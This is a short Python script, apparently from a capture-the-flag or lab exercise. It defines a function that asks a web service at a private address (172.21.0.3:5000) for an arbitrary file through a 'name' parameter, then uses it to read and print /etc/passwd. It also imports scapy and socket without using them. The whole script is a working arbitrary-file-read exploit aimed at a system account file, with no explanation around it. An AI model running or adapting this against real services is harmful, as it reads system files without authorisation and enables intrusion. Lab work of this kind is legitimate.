from scapy.all import send,IP,TCP
from socket import *
import requests

def readfile(filename):
	r = requests.get('http://172.21.0.3:5000/file?name={}'.format(filename))
	return r.text

print(readfile('/etc/passwd'))